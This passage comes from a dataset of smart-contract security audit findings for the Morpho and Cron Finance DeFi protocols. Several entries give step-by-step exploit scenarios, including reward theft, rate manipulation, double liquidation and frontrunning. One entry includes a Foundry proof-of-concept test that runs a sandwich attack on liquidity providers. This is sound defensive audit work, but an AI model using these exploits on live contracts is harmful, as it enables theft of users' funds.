it by their supply balance.  The user accumulated rewards in userUnclaimedRewards[user] can be withdrawn by calling PositionMan- ager.claimRewards([sToken, ...]).  Attacker withdraws their supplied tokens again. The abovementioned steps can be performed in one single transaction to steal unclaimed rewards from all Morpho positions.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "FullMath requires overflow behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "UniswapV3s FullMath.sol is copied and migrated from an old solidity version to version 0.8 which reverts on overflows but the old FullMath relies on the implicit overflow behavior. The current code will revert on overflows when it should not, breaking the SwapManagerUniV3 contract.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Morphos USDT mainnet market can end up in broken state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Note that USDT on Ethereum mainnet is non-standard and requires resetting the approval to zero (see USDT L199) before being able to change it again. In _repayERC20ToPool , it could be that _amount is approved but then _amount = Math.min(...) only repays a smaller amount, meaning there remains a non-zero approval for Aave. Any further _repayERC20ToPool/_- supplyERC20ToPool calls will then revert in the approve call. Users cannot interact with most functions of the Morpho USDT market anymore. Example: Assume the attacker is first to borrow from the USDT market on Morpho.  Attacker borrows 1000 USDT through Morpho from the Aave pool (and some other collateral to cover the debt).  Attacker directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position.  Attacker attempts to repay 1000 USDT on Morpho. the contracts debt balance is only 999 and the _amount = Math.min(_amount, variableDebtTo- ken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) computation will only repay 999. An approval of 1 USDT remains. It will approve 1000 USDT but  The USDT market is broken as it reverts on supply / repay calls when trying to approve the new amount", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Wrong reserve factor computation on P2P rates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The reserve factor is taken on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. Its currently overcharging suppliers and borrowers and making it possible to earn a worse rate on Morpho than the pool rates. supplyP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS - reserveFactor[_marketAddress])) / MAX_BASIS_POINTS; borrowP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS + reserveFactor[_marketAddress])) / MAX_BASIS_POINTS;", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "SwapManager assumes Morpho token is token0 of every token pair", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The consult function wrongly assumes that the Morpho token is always the first token (token0) in the Morpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "SwapManager fails at updating TWAP", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The update function returns early without updating the TWAP if the elapsed time is past the TWAP period. Meaning, once the TWAP period passed the TWAP is stale and forever represents an old value. This could lead to a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "P2P rate can be manipulated as its a lazy-updated snapshot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The P2P rate is lazy-updated upon interactions with the Morpho protocol. It takes the mid-rate of Its possible to manipulate these rates before triggering an update on the current Aave supply and borrow rate. Morpho. function _updateSPYs(address _marketAddress) internal { DataTypes.ReserveData memory reserveData = lendingPool.getReserveData( IAToken(_marketAddress).UNDERLYING_ASSET_ADDRESS() ); uint256 meanSPY = Math.average( reserveData.currentLiquidityRate, reserveData.currentVariableBorrowRate ) / SECONDS_PER_YEAR; // In ray } Example: Assume an attacker has a P2P supply position on Morpho and wants to earn a very high APY on it. He does the following actions in a single transaction:  Borrow all funds on the desired Aave market. (This can be done by borrowing against flashloaned collateral).  The utilisation rate of the market is now 100%. The borrow rate is the max borrow rate and the supply rate is (1.0 - reserveFactor) * maxBorrowRate. The max borrow rate can be higher than 100% APY, see Aave docs.  The attacker triggers an update to the P2P rate, for example, by supplying 1 token to the pool Positions- ManagerForAave.supply(poolTokenAddress, 1, ...), triggering marketsManager.updateSPYs(_poolTo- kenAddress).  The new mid-rate is computed which will be (2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBor- rowRate.  The attacker repays their Aave debt in the same transaction, not paying any interest on it.  All P2P borrowers now pay the max borrow rate to the P2P suppliers until the next time a user interacts with the market on Morpho.  This process can be repeated to keep the APY high.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Liquidating Morphos Aave position leads to state desynchronization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Morpho has a single position on Aave that encompasses all of Morphos individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desynchronize from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. Its also possible to double-liquidate for a profit. Example: Theres a single borrower B1 on Morpho who is connected to the Aave pool.  B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho  The ETH price crashes and the position becomes liquidatable.  A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit.  This repaid debt / removed collateral is not synced with Morpho. The users supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.  The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus.  The state remains desynced.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Frontrunners can exploit the system by not allowing head of DLL to match in P2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "For a given asset X, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x Whenever there is a new transaction in the mempool to borrow 100 units of x:  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will place the frontrunner on the head (assuming very high gas is supplied).  Borrowers transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a blocks time period.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "TWAP intervals should be flexible as per market conditions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The protocol is using the same TWAP_INTERVAL for both weth-morpho and weth-reward token pool while their liquidity and activity might be different. It should use separate appropriate values for both pools.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "PositionsManagerForAave claimToTreasury could allow sending underlying to 0x address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "claimToTreasury is currently not verifying if the treasuryVault address is != address(0). In the current state, it would allow the owner of the contract to burn the underlying token instead of sending it to the intended treasury address.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "rewardsManager used in MatchingEngineForAave could be not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "MatchingEngineForAave update the userUnclaimedRewards for a supplier/borrower each time it gets updated. rewardsManager is not initialized in PositionsManagerForAaveLogic.initialize but only via Po- sitionsManagerForAaveGettersSetters.setRewardsManager, which means that it will start as address(0). Each time a supplier or borrower gets updated and the rewardsManager address is empty, the transaction will revert. To replicate the issue, just comment positionsManager.setRewardsManager(address(rewardsManager)); in TestSetup and run make c-TestSupply. All tests will fail with [FAIL. Reason: Address: low-level delegate call failed]", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Missing input validation checks on contract initialize/constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Contract creation/initialization of a contract in a wrong/inconsistent state. initialize/constructor input parameters should always be validated to prevent the", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Setting a new rewards manager breaks claiming old rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Setting a new rewards manager will break any old unclaimed rewards as users can only claim through the PositionManager.claimRewards function which then uses the new reward manager.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "maxGas variable is used to determine how much gas the matchSuppliers, unmatchSuppliers, matchBorrowers and unmatchBorrowers can consume while trying to match/unmatch supplier/borrower and also updating their position if matched.  maxGas = 0 will make entirely skip the loop.  maxGas low would make the loop run at least one time but the smaller maxGas is the higher is the possibility that not all the available suppliers/borrowers are matched/unmatched.  maxGas could make the loop consume all the block gas, making the tx revert. Note that maxGas can be overriden by the user when calling supply, borrow", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "NDS min/max value should be properly validated to avoid tx to always fail/skip loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "PositionsManagerForAaveLogic is currently initialized with a default value of NDS = 20. The NDS value is used by MatchingEngineForAave when it needs to call DoubleLinkedList.insertSorted in both updateBorrowers and updateSuppliers updateBorrowers, updateSuppliers are called by  MatchingEngineForAavematchBorrowers  MatchingEngineForAaveunmatchBorrowers  MatchingEngineForAavematchSuppliers  MatchingEngineForAaveunmatchSuppliers Those functions and also directly updateBorrowers and updateSuppliers are also called by PositionsManager- ForAaveLogic Problems:  A low NDS value would make the loop inside insertSorted exit early, increasing the probability of a sup- plier/borrower to be added to the tail of the list. This is something that Morpho would like to avoid because it would decrease protocol performance when it needs to match/unmatch suppliers/borrowers.  In the case where a list is long enough, a very high value would make the tranaction revert each time one of those function directly or indirectly call insertSorted. The gas rail guard present in the match/unmatch supplier/borrow is useless because the loop would be called at least one time.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Initial SwapManager cumulative prices values are wrong", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The initial cumulative price values are integer divisions of unscaled reserves and not UQ112x112 fixed-point values. (reserve0, reserve1, blockTimestampLast) = pair.getReserves(); price0CumulativeLast = reserve1 / reserve0; price1CumulativeLast = reserve0 / reserve1; One of these values will (almost) always be zero due to integer division. Then, when the difference is taken to the real currentCumulativePrices in update, the TWAP will be a large, wrong value. The slippage checks will not work correctly.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "User withdrawals can fail if Morpho position is close to liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold, the borrow will fail and the position cannot be liquidated. Therefore withdrawals could fail.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Event Withdrawn is emitted using the wrong amounts of supplyBalanceInOf", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Inside the _withdraw function, all changes performed to supplyBalanceInOf are done using the _supplier address. The _receiver is correctly used only to transfer the underlying token via underlyingToken.safeTransfer(_- receiver, _amount); The Withdrawn event should be emitted passing the supplyBalanceInOf[_poolTokenAddress] of the supplier and not the receiver. This problem will arise when this internal function is called by PositionsManagerForAave.liquidate where sup- plier (borrower in this case) and receiver (liquidator) would not be the same address.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "_repayERC20ToPool is approving the wrong amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_repayERC20ToPool is approving the amount of underlying token specified via the input parameter _amount when the correct amount that should be approved is the one calculated via: _amount = Math.min( _amount, variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) );", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "Possible unbounded loop over enteredMarkets array in _getUserHypotheticalBalanceStates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "PositionsManagerForAaveLogic._getUserHypotheticalBalanceStates is looping enteredMar- kets which could be an unbounded array leading to a reverted transaction caused by a block gas limit. While it is true that Morpho will probably handle a subset of assets controlled by Aave, this loop could still revert because of gas limits for a variety of reasons:  In the future Aave could have more assets and Morpho could match 1:1 those assets.  Block gas size could decrease.  Opcodes could cost more gas.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "Missing parameter validation on setters and event spamming prevention", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "User parameter validity should always be verified to prevent contract updates in an inconsistent state. The parameters value should also be different from the old one in order to prevent event spamming (emitting an event when not needed) and improve contract monitoring. contracts/aave/RewardsManagerForAave.sol 20 function setAaveIncentivesController(address _aaveIncentivesController) external override onlyOwner { + + } require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); contracts/aave/MarketsManagerForAave.sol function setReserveFactor(address _marketAddress, uint16 _newReserveFactor) external onlyOwner { reserveFactor[_marketAddress] = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; updateRates(_marketAddress); emit ReserveFactorSet(_marketAddress, reserveFactor[_marketAddress]); require(_marketAddress != address(0), \"param != address(0)\"); uint16 finalReserveFactor = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; if( finalReserveFactor !== reserveFactor[_marketAddress] ) { reserveFactor[_marketAddress] = finalReserveFactor; emit ReserveFactorSet(_marketAddress, finalReserveFactor); } updateRates(_marketAddress); - - - - - - - + + + + + + + + + + + } function setNoP2P(address _marketAddress, bool _noP2P) external onlyOwner isMarketCreated(_marketAddress) { + } require(_noP2P != noP2P[_marketAddress], \"param != prevValue\"); noP2P[_marketAddress] = _noP2P; emit NoP2PSet(_marketAddress, _noP2P); function updateP2PExchangeRates(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateP2PExchangeRates(_marketAddress); + { } 21 function updateSPYs(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateSPYs(_marketAddress); + { } contracts/aave/positions-manager-parts/PositionsManagerForAaveGettersSetters.sol function setAaveIncentivesController(address _aaveIncentivesController) external onlyOwner { require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); + + } Important note: _newNDS min/max value should be accurately validated by the team because this will influence the maximum number of cycles that DDL.insertSorted can do. Setting a value too high would make the transaction fail while setting it too low would make the insertSorted loop exit earlier, resulting in the user being added to the tail of the list. A more detailed issue about the NDS value can be found here: #33 function setNDS(uint8 _newNDS) external onlyOwner { // add a check on `_newNDS` validating correctly max/min value of `_newNDS` require(NDS != _newNDS, \"param != prevValue\"); NDS = _newNDS; emit NDSSet(_newNDS); + + } Important note: _newNDS set to 0 would skip all theMatchingEngineForAave match/unmatch supplier/borrower functions if the user does not specify a custom maxGas A more detailed issue about NDS value can be found here: #34 function setMaxGas(MaxGas memory _maxGas) external onlyOwner { // add a check on `_maxGas` validating correctly max/min value of `_maxGas` // add a check on `_maxGas` internal value checking that at least one of them is different compared to the old version maxGas = _maxGas; emit MaxGasSet(_maxGas); + + ,! } function setTreasuryVault(address _newTreasuryVaultAddress) external onlyOwner { require(_newTreasuryVaultAddress != address(0), \"param != address(0)\"); require(_newTreasuryVaultAddress != treasuryVault, \"param != prevValue\"); treasuryVault = _newTreasuryVaultAddress; emit TreasuryVaultSet(_newTreasuryVaultAddress); + + } function setRewardsManager(address _rewardsManagerAddress) external onlyOwner { require(_rewardsManagerAddress != address(0), \"param != address(0)\"); require(_rewardsManagerAddress != rewardsManager, \"param != prevValue\"); rewardsManager = IRewardsManagerForAave(_rewardsManagerAddress); emit RewardsManagerSet(_rewardsManagerAddress); + + } Important note: Should also check that _poolTokenAddress is currently handled by the PositionsManagerForAave and by the MarketsManagerForAave. Without this check a poolToken could start in a paused state. 22 + function setPauseStatus(address _poolTokenAddress) external onlyOwner { require(_poolTokenAddress != address(0), \"param != address(0)\"); bool newPauseStatus = !paused[_poolTokenAddress]; paused[_poolTokenAddress] = newPauseStatus; emit PauseStatusSet(_poolTokenAddress, newPauseStatus); }", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "DDL should prevent inserting items with 0 value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Currently the DDL library is only checking that the actual value (_list.accounts[_id].value) in the list associated with the _id is 0 to prevent inserting duplicates. The DDL library should also verify that the inserted value is greater than 0. This check would prevent adding users with empty values, which may potentially cause the list and as a result the overall protocol to underperform.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted iterates more than max iterations parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The insertSorted function iterates _maxIterations + 1 times instead of _maxIterations times.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted does not behave like a FIFO for same values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Users that have the same value are inserted into the list before other users with the same value. It does not respect the \"seniority\" of the users order and should behave more like a FIFO queue.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted inserts elements at wrong index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The insertSorted function inserts elements after the last element has been insterted, when these should have actually been insterted before the last element. The sort order is therefore wrong, even if the maximum iterations count has not been reached. This is because of the check that the current element is not the tail. if ( ... && current != _list.tail) { insertBefore } else { insertAtEnd } Example:  list = [20]. insert(40) then current == list.tail, and is inserted at the back instead of the front. result = [20, 40]  list = [30, 10], insert(20) insertion point should be before current == 10, but also current == tail therfore the current != _list.tail condition is false and the element is wrongly inserted at the end. result = [30, 10, 20]", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "PositionsManagerForAaveLogic gas optimization suggestions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Update the remainingTo variable only when needed. Inside each function, the remainingTo counter could be moved inside the if statement to avoid calculation when the amount that should be subtracted is >0.", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "MarketsManagerForAave._updateSPYs could store calculations in local variables to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The calculation in the actual code must be updated following this issue: #36. This current issue is an example on how to avoid an additional SLOAD. The function could store locally currentReserveFactor, newSupplyP2PSPY and newBorrowP2PSPY to avoid addi- tional SLOAD", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "Declare variable as immutable/constant and remove unused variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Some state variable can be declared as immutable or constant to save gas. Constant variables should be names in uppercase + snake case following the official Solidity style guide. Additionally, variables which are never used across the protocol code can be removed to save gas during deployment and improve readability. RewardsManagerForAave.sol -ILendingPoolAddressesProvider public addressesProvider; -ILendingPool public lendingPool; +ILendingPool public immutable lendingPool; -IPositionsManagerForAave public positionsManager; +IPositionsManagerForAave public immutable positionsManager; SwapManagerUniV2.sol -IUniswapV2Router02 public swapRouter = IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter ,! +IUniswapV2Router02 public constant SWAP_ROUTER = ,! IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter -IUniswapV2Pair public pair; +IUniswapV2Pair public immutable pair; SwapManagerUniV3.sol 27 -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -address public WETH9; // Intermediate token address. +address public immutable WETH9; // Intermediate token address. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -bool public singlePath; +bool public boolean singlePath; SwapManagerUniV3OnEth.sol -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -IUniswapV3Pool public pool2; +IUniswapV3Pool public immutable pool2;", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "Function does not revert if balance to transfer is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Currently when the claimToTreasury() function is called it gets the amountToClaim by using un- derlyingToken.balanceOf(address(this). It then uses this amountToClaim in the safeTransfer() function and the ReserveFeeClaimed event is emitted. The problem is that the function does not take into account that it is possible for the amountToClaim to be 0. In this case the safeTransfer function would still be called and the ReserveFeeClaimed event would still be emitted unnecessarily.", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "matchingEngine should be initialized in PositionsManagerForAaveLogics initialize function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "MatchingEngineForAave inherits from PositionsManagerForAaveStorage which is an UUPSUp- gradeable contract. Following UUPS best practices, should also be initialized. the MatchingEngineForAave deployed by PositionsManagerForAaveLogic", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Misc: notation, style guide, global unit types, etc", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Follow solidity notation, standard style guide and global unit types to improve readability.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Outdated or wrong Natspec documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Some Natspec documentation is missing parameters/return value or is not correctly updated to reflect the function code.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Use the official UniswapV3 0.8 branch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The current repository creates local copies of the UniswapV3 codebase and manually migrates the contracts to Solidity 0.8.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Unused events and unindexed event parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Certain parameters should be defined as indexed to track them from web3 applications / security monitoring tools.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Rewards are ignored in the on-pool rate computation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Morpho claims that the protocol is a strict improvement upon the underlying lending protocols. It tries to match as many suppliers and borrowers P2P at the supply/borrow mid-rate of the underlying protocol. However, given high reward incentives paid out to on-pool users it could be the case that being on the pool yields a better rate than the P2P rate.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Balancer Read-Only Reentrancy Vulnerability (Changes from dev team added to audit.)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Balancer's read-only reentrancy vulnerability potentially effects the following Cron-Fi TWAMM func- tions:  getVirtualReserves  getVirtualPriceOracle  executeVirtualOrdersToBlock A mitigation was provided by the Balancer team that uses a minimum amount of gas to trigger a reentrancy check. The Balancer vulnerability is discussed in greater detail here:  reentrancy-vulnerability-scope-expanded/4345", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "Overpayment of one side of LP Pair onJoinPool due to sandwich or user error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "Only one of the two incoming tokens are used to determine the amount of pool tokens minted (amountLP) on join amountLP = Math.min( _token0InU112.mul(supplyLP).divDown(_token0ReserveU112), _token1InU112.mul(supplyLP).divDown(_token1ReserveU112) ); In the event the price moves between the time a minter sends their transaction and when it is included in a block, they may overpay for one of _token0InU112 or _token1InU112. This can occur due to user error, or due to being sandwiched. Concrete example: pragma solidity ^0.7.0; pragma experimental ABIEncoderV2; import \"forge-std/Test.sol\"; import \"../HelperContract.sol\"; import { C } from \"../../Constants.sol\"; import { ExecVirtualOrdersMem } from \"../../Structs.sol\"; contract JoinSandwich is HelperContract { uint256 WAD = 10**18; function testManualJoinSandwich() public { 5 address userA = address(this); address userB = vm.addr(1323); // Add some base liquidity from the future attacker. addLiquidity(pool, userA, userA, 10**7 * WAD, 10**7 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userA), 10**7 * WAD - C.MINIMUM_LIQUIDITY); // Give userB some tokens to LP with. token0.transfer(userB, 1_000_000 * WAD); token1.transfer(userB, 1_000_000 * WAD); addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userB), 10**6 * WAD); exit(10**6 * WAD, ICronV1Pool.ExitType(0), pool, userB); assertEq(CronV1Pool(pool).balanceOf(userB), 0); // Full amounts are returned b/c the exit penalty has been removed (as is being done anyway). assertEq(token0.balanceOf(userB), 1_000_000 * WAD); assertEq(token1.balanceOf(userB), 1_000_000 * WAD); // Now we'll do the same thing, simulating a sandwich from userA. uint256 swapProceeds = swapPoolAddr(5 * 10**6 * WAD, /* unused */ 0, ICronV1Pool.SwapType(0), address(token0), pool, ,! userA); // Original tx from userB is sandwiched now... addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); // Sell back what was gained from the first swap. swapProceeds = swapPoolAddr(swapProceeds, /* unused */ 0, ICronV1Pool.SwapType(0), address(token1), pool, userA); emit log_named_uint(\"swapProceeds 1 to 0\", swapProceeds); // allows seeing what userA lost to fees // Let's see what poor userB gets back of their million token0 and million token1... assertEq(token0.balanceOf(userB), 0); assertEq(token1.balanceOf(userB), 0); exit(ICronV1Pool(pool).balanceOf(userB), ICronV1Pool.ExitType(0), pool, userB); emit log_named_uint(\"userB token0 after\", token0.balanceOf(userB)); emit log_named_uint(\"userB token1 after\", token1.balanceOf(userB)); } } Output: Logs: swapProceeds 1 to 0: 4845178856516554015932796 userB token0 after: 697176321467715374004199 userB token1 after: 687499999999999999999999 1. We have a pool where the attacker is all of the liquidity (107 of each token) 2. A LP tries to deposit another 106 in equal proportions 3. The attacker uses a swap of 5 (cid:3) 106 of one of the tokens to distort the pool. They lose about 155k in the process, but the LP loses far more, nearly all of which goes to the attacker--about 615,324 (sum of the losses of the two tokens since they're equally priced in this example). The attacker could be a significantly smaller proportion of the pool and still find this attack profitable. They could also JIT the liquidity since the early withdrawal penalty has been removed. The attack becomes infeasible for very large pools (has to happen over multiple TXs so can't flash loan --need own capital), but is relevant in practice.", "labels": ["Spearbit", "CronFinance", "Severity: High Risk"]}, {"title": "Loss of Long-Term Swap Proceeds Likely in Pools With Decimal or Price Imbalances", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf", "body": "This TWAMM implementation tracks the proceeds of long-term swaps efficiently via accumulated values called \"scaled proceeds\" for each token. In every order block interval (OBI), the scaled proceeds for e.g. the sale of token 0 are incremented by (quantity of token 1 purchased during the OBI) (cid:3)264= (sales rate of token 0 during the OBI) Then the proceeds of any specific long-term swap can be computed as the product of the difference between the scaled proceeds at the current block (or the expiration block of the order if filled) and the last block for which proceeds were claimed for the order and the order's sales rate, divided by 264: last := min(currentBlock, orderExpiryBlock) prev := block of last proceeds collection, or block order was placed in if this is the first withdrawal LT swap proceeds = (scaledProceedsl ast (cid:0) scaledProceedsprev ) (cid:3) (ordersalesrate)=264 The value 264 is referred to as the \"scaling factor\" and is intended to reduce precision loss in the division to determine the increment to the scaled proceeds. The addition to increment the scaled proceeds and the subtraction to compute its net change is both intentionally done with unchecked arithmetic--since only the difference matters, so long as at most one overflow occurs between claim-of-proceeds events for any given order, the computed proceeds will be correct (up to rounding errors). If two or more overflows occur, however, funds will be lost by the swapper (unclaimable and locked in the contract). Additionally, to cut down on gas costs, the scaled proceeds for 